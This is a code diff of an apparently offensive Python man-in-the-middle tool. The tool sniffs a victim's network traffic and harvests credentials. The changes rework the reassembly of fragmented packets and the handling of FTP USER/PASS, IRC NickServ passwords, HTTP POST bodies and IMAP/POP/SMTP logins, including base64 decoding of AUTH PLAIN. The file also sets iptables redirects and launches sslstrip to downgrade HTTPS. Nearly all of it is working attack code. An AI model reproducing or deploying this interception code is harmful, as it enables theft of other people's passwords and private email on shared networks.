@@ -4,7 +4,6 @@
 ADD A DICTIONARY OF LOGINS AND PASSWORDS AND ON CTRL-C HAVE IT THROW ALL THE USERNAMES, PASSWORDS, AND SERVER TO OUTPUT
 MAKE DNSSPOOF RELIABLE
 ADD wifi-monitor TO IT IF NO -ip OPTION EXISTS
-MAKE MAILSPY NOT DOUBLE OUTPUT
 '''
 
 #from logging import getLogger
@@ -50,13 +49,6 @@ C  = '\033[36m' # cyan
 GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
-oldack = None
-oldload = None
-oldurl = None
-oldhttp = None
-oldhost = None
-combined_load = None
-
 if args.write:
 	logger = open('intercept.log.txt', 'w+')
 
@@ -83,71 +75,57 @@ class Parser():
 	POPdest = ''
 	Cookies = []
 	IRCnick = ''
-	oldack = ''
-	oldpkt = ''
-	fragged = 0
+	oldHTTPack = ''
+	oldHTTPload = ''
+	HTTPfragged = 0
+	oldmailack = ''
+	oldmailload = ''
+	mailfragged = 0
+	sentMsgs = []
 
 	def start(self, payload):
 		try:
 			data = payload.get_data()
-			pkt = Ether(data)/IP(data)
+			pkt = IP(data)
 		except:
 			return
-##ADDED FOR TSTING
-#		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[IP].src == victimIP:
-#			load = repr(pkt[Raw].load)[1:-1]
-#			ack = pkt[TCP].ack
-#			if 'POST ' in load:
-#				if ack == self.oldack:
-#					self.oldpkt = self.oldpkt+load
-#					load = self.oldpkt
-#					self.fragged = 1
-#				else:
-#					self.oldpkt = load
-#					self.oldack = ack
-#					self.fragged = 0
-#				print load+'\n'
-#		return
-################
-		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP):
+
+		if pkt.haslayer(Raw) and pkt.haslayer(TCP):
 			dport = pkt[TCP].dport
 			sport = pkt[TCP].sport
 			ack = pkt[TCP].ack
-			# These MAC vars are always inaccurate! Why!? I could prevent the script from double outputting some things (outgoing email) if these were accurate
-			# They're accurate with sniff(), just not NFQUEUE
-			MAC_src = pkt[Ether].src
-			MAC_dst = pkt[Ether].dst
 			IP_dst = pkt[IP].dst
 			IP_src = pkt[IP].src
 			# Can't use repr if we're gzip deflating which will be necessary when code injection is added
 			load = repr(pkt[Raw].load)[1:-1]
 			mail_ports = [25, 26, 110, 143]
 			# Catch fragmented packets only if they're being sent from the victim to a web server
-			if dport == 80 or sport in mail_ports or dport in mail_ports:
-				if ack == self.oldack:
-					self.oldpkt = self.oldpkt+load
-					load = self.oldpkt
-					self.fragged = 1
-				else:
-					self.oldpkt = load
-					self.oldack = ack
-					self.fragged = 0
 			if dport in mail_ports or sport in mail_ports:
-				self.mailspy(load, dport, sport, MAC_dst, IP_dst, IP_src)
+				self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
 			if dport == 6667 or sport == 6667:
 				self.irc(load, dport, sport, IP_src)
 			if dport == 21 or sport == 21:
 				self.ftp(load, IP_dst, IP_src)
 			if dport == 80 or sport == 80:
-				self.URL(load, ack, dport, sport)
+				self.URL(load, ack, dport, sport, pkt)
 
-	def URL(self, load, ack, dport, sport):
-#		global oldack, oldload, oldurl, oldhost, oldhttp, combined_load
+	def URL(self, load, ack, dport, sport, pkt):
 
 		host = None
 		get = None
 		post = None
 		url = None
+
+		# Catch fragmented HTTP posts
+		if dport == 80 and load != '':
+			if ack == self.oldHTTPack:
+				self.oldHTTPload = self.oldHTTPload+load
+				load = self.oldHTTPload
+				self.HTTPfragged = 1
+			else:
+				self.oldHTTPload = load
+				self.oldHTTPack = ack
+				self.HTTPfragged = 0
 
 		try:
 			headers, body = load.split(r"\r\n\r\n", 1)
@@ -211,10 +189,13 @@ class Parser():
 				if 'ocsp' in url:
 					print B+'[+] POST: '+W+url
 				elif body != '':
-					urlsplit = url.split('/')
-					url = url[0]+'/'+url[1]
-					if self.fragged == 1:
-						print B+'[+] POST: '+W+url+B+" Fragmented HTTP POST's combined load: "+body+W
+					try:
+						urlsplit = url.split('/')
+						url = urlsplit[0]+'/'+urlsplit[1]
+					except:
+						pass
+					if self.HTTPfragged == 1:
+						print B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W
 					else:
 						print B+'[+] POST: '+W+url+B+' HTTP POST load: '+body+W
 					username = re.findall(user_regex, body)
@@ -230,17 +211,14 @@ class Parser():
 	def ftp(self, load, IP_dst, IP_src):
 		load = load.replace(r"\r\n", "")
 		if 'USER ' in load:
-			load = 'USER'+load.split('USER')[1]
 			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
 			if args.write:
 				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
 		if 'PASS ' in load:
-			load = 'PASS'+load.split('PASS')[1]
 			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
 			if args.write:
 				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
-		if 'failed' in load:
-			load = '530'+load.split('530')[1]
+		if 'authentication failed' in load:
 			print R+'[*] FTP '+load+W
 			if args.write:
 				logger.write('[*] FTP '+load+'\n')
@@ -252,7 +230,7 @@ class Parser():
 					if 'NICK ' in load[0]:
 						self.IRCnick = load[0].split('NICK ')[1]
 						server = load[1].replace('USER user user ', '').replace(' :user', '')
-						print R+'[!] IRC username:'+self.IRCnick+' on '+server+W
+						print R+'[!] IRC username: '+self.IRCnick+' on '+server+W
 						if args.write:
 							logger.write('[!] IRC username: '+self.IRCnick+' on '+server+'\n')
 					if 'NS IDENTIFY ' in load[0]:
@@ -327,7 +305,19 @@ class Parser():
 					if args.write:
 						logger.write('[!] Password: '+p[1]+'\n')
 
-	def mailspy(self, load, dport, sport, MAC_dst, IP_dst, IP_src):
+	def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
+
+		# Catch fragmented mail packets
+		if dport in mail_ports or sport in mail_ports and load != '':
+			if ack == self.oldmailack:
+				self.oldmailload = self.oldmailload+load
+				load = self.oldmailload
+				self.mailfragged = 1
+			else:
+				self.oldmailload = load
+				self.oldmailack = ack
+				self.mailfragged = 0
+
 		try:
 			headers, body = load.split(r"\r\n\r\n", 1)
 		except:
@@ -335,6 +325,7 @@ class Parser():
 			body = ''
 		header_lines = headers.split(r"\r\n")
 		email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
+
 #		Find passwords
 		if dport in [25, 26, 110, 143]:
 			self.passwords(IP_src, load, dport, IP_dst)
@@ -347,8 +338,8 @@ class Parser():
 
 	def passwords(self, IP_src, load, dport, IP_dst):
 		# Get rid of all the hex at the beginning of the load
-		load = load.replace(r'\r\n', '').split(r"\x")[-1][2:]
-		if dport == 143 and IP_src == victimIP and len(load) > 10:
+		load = load.replace(r'\r\n', '')
+		if dport == 143 and IP_src == victimIP and len(load) > 15:
 			if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
 				print R+'[!] IMAP user and pass found: '+load+W
 				if args.write:
@@ -377,11 +368,15 @@ class Parser():
 					logger.write('[!] POP authentication found: '+load+'\n')
 				self.decode(load, dport)
 
-	# This doubles up the outgoing message for some reason. Fix.
 	def outgoing(self, headers, body, header_lines, email_headers, IP_src):
-#		if IP_src == victimIP:
 		if 'Message-ID' in headers:
 			for l in header_lines:
+				# Don't double output sent messages
+				if 'Message-ID' in l:
+					if l in self.sentMsgs:
+						return
+					else:
+						self.sentMsgs.append(l)
 				for x in email_headers:
 					if x in l:
 						self.OheadersFound.append(l)
@@ -432,85 +427,23 @@ class Parser():
 
 	def decode(self, load, dport):
 		decoded = ''
-		# This can probably be optimized better...
-		for i in xrange(0,5):
-			if dport == 25 or dport == 26:
-				# Sometimes the hex at the beginning of the load goes more than 2 chars past the last \x
-				try:
-					b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[i:]
-					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-					# Sometimes the hex at the beginning of the load goes 2 chars past the last \x and sometimes 3 or 4
-				except:
-					pass
-				if '@' in decoded:
-					print R+'[!] Decoded:'+decoded+W
-					if args.write:
-						logger.write('[!] Decoded:'+decoded+'\n')
-					break
-				else:
-					continue
-			else:
-				try:
-					b64str = load[i:]
-					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-				except:
-					pass
-				if '@' in decoded:
-					print R+'[!] Decoded:'+decoded+W
-					if args.write:
-						logger.write('[!] Decoded:'+decoded+'\n')
-					break
-				else:
-					continue
-#		if dport == 26 or dport == 25:
-#			try:
-#				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
-#				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-#				# Sometimes the hex at the beginning of the load goes 2 chars past the last \x and sometimes 3 or 4
-#				if '@' in decoded:
-#					print R+'[!] Decoded:'+decoded+W
-#					if args.write:
-#						logger.write('[!] Decoded:'+decoded+'\n')
-#				else:
-#					b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[1:]
-#					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-#					if '@' in decoded:
-#						print R+'[!] Decoded:'+decoded+W
-#						if args.write:
-#							logger.write('[!] Decoded:'+decoded+'\n')
-#					else:
-#						b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[2:]
-#						decoded = repr(b64decode(b64str)).replace("'", "").replace(r'\x00', ' ')
-#						if '@' in decoded:
-#							print R+'[!] Decoded:'+decoded+W
-#							if args.write:
-#								logger.write('[!] Decoded:'+decoded+'\n')
-#			except:
-#				pass
-#		else:
-#			try:
-#				b64str = load
-#				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-#				if '@' in decoded:
-#					print R+'[!] Decoded:',decoded+W
-#					if args.write:
-#						logger.write('[!] Decoded:'+decoded+'\n')
-#				else:
-#					b64str = load[1:]
-#					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-#					if '@' in decoded:
-#						print R+'[!] Decoded:',decoded+W
-#						if args.write:
-#							logger.write('[!] Decoded:'+decoded+'\n')
-#					else:
-#						b64str = load[2:]
-#						decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-#						if '@' in decoded:
-#							print R+'[!] Decoded:',decoded+W
-#							if args.write:
-#								logger.write('[!] Decoded:'+decoded+'\n')
-#			except:
-#				pass
+		if dport == 25 or dport == 26:
+			try:
+				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
+				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+			except:
+				pass
+		else:
+			try:
+				b64str = load
+				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+			except:
+				pass
+		# Test to see if decode worked
+		if '@' in decoded:
+			print R+'[!] Decoded:'+decoded+W
+			if args.write:
+				logger.write('[!] Decoded:'+decoded+'\n')
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
@@ -546,6 +479,7 @@ class Threads():
 	def sslstrip(self, DN):
 		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
 		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+#		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
 		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
 		Popen(xterm, stdout=PIPE, stderr=DN)
 
